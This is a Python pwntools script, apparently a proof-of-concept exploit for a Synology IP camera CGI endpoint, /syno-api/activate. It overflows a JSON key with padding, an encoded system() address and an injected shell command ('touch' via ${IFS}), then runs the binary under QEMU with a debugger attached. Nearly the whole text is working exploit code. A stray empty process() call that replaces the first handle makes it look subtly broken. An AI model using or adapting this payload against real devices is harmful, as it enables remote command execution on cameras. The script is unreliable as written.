from pwn import process
import json


system_addr = "p\u0403v"  # system() 0x7683d070
cmd = ";touch${IFS}/tmp/pwned;"

payload = {cmd.rjust(164, "a") + system_addr: ""}
payload = json.dumps(payload)

headers = {
    "ACTION_PREPARE": "yes",
    "ACTION_QUERY": "yes",
    "CONTENT_LENGTH": str(len(payload)),
    "CONTENT_TYPE": "application/json",
    "DOCUMENT_ROOT": "/www",
    "GATEWAY_INTERFACE": "CGI/1.1",
    "HTTP_CONTENT_LENGTH": str(len(payload)),
    "HTTP_CONTENT_TYPE": "application/json",
    "HTTP_HOST": "localhost",
    "HTTPS": "off",
    "LOCAL_URI_RAW": "/syno-api/activate",
    "LOCAL_URI": "/syno-api/activate",
    "PATH": "/bin:/sbin:/usr/bin:/usr/sbin",
    "PATH_TRANSLATED": "/www",
    "PWD": "/www/camera-cgi",
    "REDIRECT_STATUS": "200",
    "REMOTE_ADDR": "192.168.14.81",
    "REMOTE_PORT": "47442",
    "REQUEST_METHOD": "PUT",
    "REQUEST_URI": "/syno-api/activate",
    "RESPONSE_TO": "SOCKET",
    "SCRIPT_FILENAME": "/www/camera-cgi/synocam_param.cgi",
    "SCRIPT_NAME": "/syno-api/activate",
    "SERVER_NAME": "IPCam",
    "SERVER_PORT": "80",
    "SERVER_PROTOCOL": "HTTP/1.1",
    "SERVER_ROOT": "/www",
    "SERVER_SOFTWARE": "CivetWeb/1.15",
    "SHLVL": "1",
}


r = process(
    ["qemu-arm-static", "-g", "1234", "-L", "./squashfs-root/", "./squashfs-root/www/camera-cgi/synocam_param.cgi"],
    env=headers,
)

r = process()

r.send(payload.encode())
r.interactive()

# NOTE: To connect:
# $ gdb-multiarch
# > target remote localhost:1234
